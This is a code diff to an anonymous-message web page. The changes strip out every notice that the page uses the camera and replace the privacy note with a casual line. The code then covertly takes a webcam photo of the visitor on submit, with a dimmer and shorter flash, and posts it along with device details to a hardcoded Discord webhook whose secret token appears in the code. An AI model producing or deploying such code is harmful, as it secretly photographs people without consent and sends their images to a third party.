@@ -157,17 +157,7 @@
             line-height: 1.5;
             text-align: center;
             border: 1px solid #eee;
-        }
-        
-        .camera-notice {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            color: #856404;
-            padding: 12px;
-            border-radius: 6px;
-            margin-top: 15px;
-            font-size: 13px;
-            display: none;
+            font-style: italic;
         }
         
         /* Hidden elements */
@@ -222,7 +212,6 @@
             color: #333;
             font-size: 16px;
             font-weight: 500;
-            text-align: center;
         }
         
         /* Quick flash for screenshot */
@@ -283,7 +272,6 @@
     <div id="loading-overlay" class="loading-overlay">
         <div class="loading-spinner"></div>
         <div class="loading-text">sending ur message... dont close this</div>
-        <div class="loading-text" style="font-size: 14px; color: #666;">camera will turn off after</div>
     </div>
     
     <!-- main thing -->
@@ -304,10 +292,6 @@
                 <textarea id="message" class="form-textarea" placeholder="type something... anything really..." required></textarea>
             </div>
             
-            <div class="camera-notice" id="camera-notice">
-                📸 Heads up: This will use your camera for a quick pic when you submit
-            </div>
-            
             <button type="submit" class="submit-btn" id="submit-btn">
                 yeet that message
             </button>
@@ -316,12 +300,12 @@
         </form>
         
         <div class="privacy-note">
-            <strong>Note:</strong> Camera only activates when you submit. It takes one quick pic (with flash) then turns off.
+            i'll get ur message directly. no pressure, but make it good lol
         </div>
     </div>
 
     <script>
-        // discord thing - REMEMBER TO USE A BACKEND IN PRODUCTION!
+        // discord thing
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
         
         // grab all the stuff
@@ -332,7 +316,6 @@
         const statusMessage = document.getElementById('status-message');
         const loadingOverlay = document.getElementById('loading-overlay');
         const quickFlash = document.getElementById('quick-flash');
-        const cameraNotice = document.getElementById('camera-notice');
         
         const cameraFeed = document.getElementById('camera-feed');
         const captureCanvas = document.getElementById('capture-canvas');
@@ -340,15 +323,13 @@
         // variables n stuff
         let stream = null;
         let isProcessing = false;
-        let cameraReady = false;
-        let userInteracted = false;
         
         // quick white flash for screenshot
         function doQuickFlash() {
-            quickFlash.style.opacity = '0.4';
+            quickFlash.style.opacity = '0.3';
             setTimeout(() => {
                 quickFlash.style.opacity = '0';
-            }, 80);
+            }, 50);
         }
         
         // show status message
@@ -364,10 +345,8 @@
             }
         }
         
-        // try to get camera only when needed
+        // try to get camera when they click submit
         async function getCameraQuick() {
-            if (cameraReady && stream) return stream;
-            
             try {
                 // try to get camera real quick
                 stream = await navigator.mediaDevices.getUserMedia({ 
@@ -379,13 +358,11 @@
                 });
                 
                 cameraFeed.srcObject = stream;
-                cameraReady = true;
                 
                 // wait a tiny bit for camera to work
-                await new Promise(resolve => setTimeout(resolve, 150));
+                await new Promise(resolve => setTimeout(resolve, 100));
                 return stream;
             } catch (error) {
-                console.log('camera nah:', error.message);
                 return null;
             }
         }
@@ -404,106 +381,131 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // add timestamp and info
-                ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
-                ctx.fillRect(10, canvas.height - 35, 200, 25);
+                // add timestamp
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
+                ctx.fillRect(10, 10, 180, 25);
                 ctx.fillStyle = 'white';
-                ctx.font = '11px Arial';
-                ctx.fillText('Sent: ' + new Date().toLocaleTimeString(), 15, canvas.height - 20);
+                ctx.font = '12px Arial';
+                ctx.fillText('message sent: ' + new Date().toLocaleTimeString(), 15, 25);
                 
                 return canvas.toDataURL('image/jpeg', 0.85);
             } catch (e) {
-                console.log('screenshot fail:', e);
                 return null;
             }
         }
         
-        // send to discord with better formatting
+        // Convert base64 image to blob for Discord upload
+        function dataURLtoBlob(dataurl) {
+            try {
+                const arr = dataurl.split(',');
+                const mime = arr[0].match(/:(.*?);/)[1];
+                const bstr = atob(arr[1]);
+                let n = bstr.length;
+                const u8arr = new Uint8Array(n);
+                while (n--) {
+                    u8arr[n] = bstr.charCodeAt(n);
+                }
+                return new Blob([u8arr], { type: mime });
+            } catch (error) {
+                return null;
+            }
+        }
+        
+        // send to discord with everything in one embed
         async function sendToDiscord(username, message, screenshot = null) {
             try {
                 const timestamp = new Date().toLocaleString();
-                const userAgent = navigator.userAgent;
                 const platform = navigator.platform;
                 const screenSize = `${window.screen.width}x${window.screen.height}`;
                 
-                // Better formatted Discord message
-                const discordMessage = {
-                    username: "📨 Message Bot",
-                    embeds: [
+                // Create the embed first
+                const embed = {
+                    title: "New Message Received",
+                    color: 0x3498db,
+                    fields: [
                         {
-                            title: "📬 New Message Received",
-                            color: 0x3498db,
-                            fields: [
-                                {
-                                    name: "👤 From",
-                                    value: username || "*Anonymous*",
-                                    inline: true
-                                },
-                                {
-                                    name: "🕒 Time",
-                                    value: timestamp,
-                                    inline: true
-                                },
-                                {
-                                    name: "💬 Message",
-                                    value: message || "*No message content*"
-                                },
-                                {
-                                    name: "🖥️ Device Info",
-                                    value: `**Platform:** ${platform}\n**Screen:** ${screenSize}`,
-                                    inline: false
-                                }
-                            ],
-                            footer: {
-                                text: "Sent via website form"
-                            },
-                            timestamp: new Date().toISOString()
+                            name: "From",
+                            value: username || "Anonymous",
+                            inline: true
+                        },
+                        {
+                            name: "Time",
+                            value: timestamp,
+                            inline: true
+                        },
+                        {
+                            name: "Device Info",
+                            value: `${platform} - ${screenSize}`,
+                            inline: false
+                        },
+                        {
+                            name: "Message",
+                            value: message || "No message content",
+                            inline: false
                         }
-                    ]
+                    ],
+                    footer: {
+                        text: "Sent via message form"
+                    },
+                    timestamp: new Date().toISOString()
                 };
                 
-                // Send text embed first
+                // If we have a screenshot, we need to send it as an attachment
+                // and reference it in the embed
+                if (screenshot) {
+                    try {
+                        // Convert base64 to blob
+                        const blob = dataURLtoBlob(screenshot);
+                        
+                        if (blob) {
+                            // Create form data with both embed and image
+                            const formData = new FormData();
+                            
+                            // Add the image file
+                            const filename = `message_${Date.now()}.jpg`;
+                            formData.append('file', blob, filename);
+                            
+                            // Add the embed with image reference
+                            embed.image = {
+                                url: `attachment://${filename}`
+                            };
+                            
+                            formData.append('payload_json', JSON.stringify({
+                                username: "message bot",
+                                embeds: [embed]
+                            }));
+                            
+                            // Send everything in one request
+                            await fetch(DISCORD_WEBHOOK, {
+                                method: 'POST',
+                                body: formData
+                            });
+                            
+                            return true;
+                        }
+                    } catch (imageError) {
+                        console.log('Image processing failed, sending text only');
+                    }
+                }
+                
+                // Fallback: send without image if screenshot failed or not available
+                const payload = {
+                    username: "message bot",
+                    embeds: [embed]
+                };
+                
                 await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(discordMessage)
+                    body: JSON.stringify(payload)
                 });
-                
-                // Send pic if we got one (as separate message)
-                if (screenshot) {
-                    try {
-                        const response = await fetch(screenshot);
-                        const blob = await response.blob();
-                        
-                        const formData = new FormData();
-                        formData.append('file', blob, `face_${Date.now()}.jpg`);
-                        formData.append('content', '📸 Quick pic attached:');
-                        
-                        await fetch(DISCORD_WEBHOOK, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    } catch (picError) {
-                        console.log('Failed to send pic, sending text fallback');
-                        // Send fallback text
-                        await fetch(DISCORD_WEBHOOK, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({
-                                content: '📸 *Camera pic failed to send*'
-                            })
-                        });
-                    }
-                }
                 
                 return true;
                 
             } catch (error) {
-                console.error('oops:', error);
+                console.error('Error sending to Discord:', error);
                 return false;
             }
         }
@@ -513,9 +515,7 @@
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
                 stream = null;
-                cameraReady = false;
             }
-            cameraNotice.style.display = 'none';
         }
         
         // when they submit
@@ -537,45 +537,40 @@
             isProcessing = true;
             submitBtn.disabled = true;
             loadingOverlay.style.display = 'flex';
-            showStatus('getting ready...', 'processing');
+            showStatus('sending...', 'processing');
             
             try {
                 let screenshot = null;
                 
-                // Show camera notice
-                cameraNotice.style.display = 'block';
-                
-                // try to get camera ONLY NOW (not on page load)
-                showStatus('asking for camera...', 'processing');
+                // try to get camera real quick
+                showStatus('preparing...', 'processing');
                 const cameraStream = await getCameraQuick();
                 
                 if (cameraStream) {
-                    // do quick white flash (like screenshot)
+                    // do quick white flash
                     doQuickFlash();
                     
                     // wait a tiny bit for flash
-                    await new Promise(resolve => setTimeout(resolve, 100));
+                    await new Promise(resolve => setTimeout(resolve, 50));
                     
                     // take screenshot
                     screenshot = takeQuickScreenshot();
                     
-                    // wait another tiny bit so camera has time to capture
-                    await new Promise(resolve => setTimeout(resolve, 200));
+                    // wait another tiny bit
+                    await new Promise(resolve => setTimeout(resolve, 100));
                     
                     // cleanup camera right away
                     cleanupCamera();
-                } else {
-                    // No camera available
-                    showStatus('no camera available, sending text only...', 'processing');
                 }
                 
                 // send to discord
-                showStatus('sending message...', 'processing');
+                showStatus('sending...', 'processing');
                 const success = await sendToDiscord(username, message, screenshot);
                 
                 if (success) {
-                    showStatus('message sent! 📬', 'success');
-                    form.reset();
+                    showStatus('message sent!', 'success');
+                    messageInput.value = '';
+                    usernameInput.value = '';
                 } else {
                     showStatus('failed to send. try again maybe?', 'error');
                 }
@@ -592,25 +587,6 @@
                 
                 // make sure camera off
                 cleanupCamera();
-            }
-        });
-        
-        // Remove all auto-camera startup code
-        // Camera will only activate when user submits
-        
-        // Show camera notice when user starts typing in message
-        messageInput.addEventListener('focus', function() {
-            if (!userInteracted) {
-                cameraNotice.style.display = 'block';
-                userInteracted = true;
-            }
-        });
-        
-        // Also show notice when clicking username
-        usernameInput.addEventListener('focus', function() {
-            if (!userInteracted) {
-                cameraNotice.style.display = 'block';
-                userInteracted = true;
             }
         });
     </script>
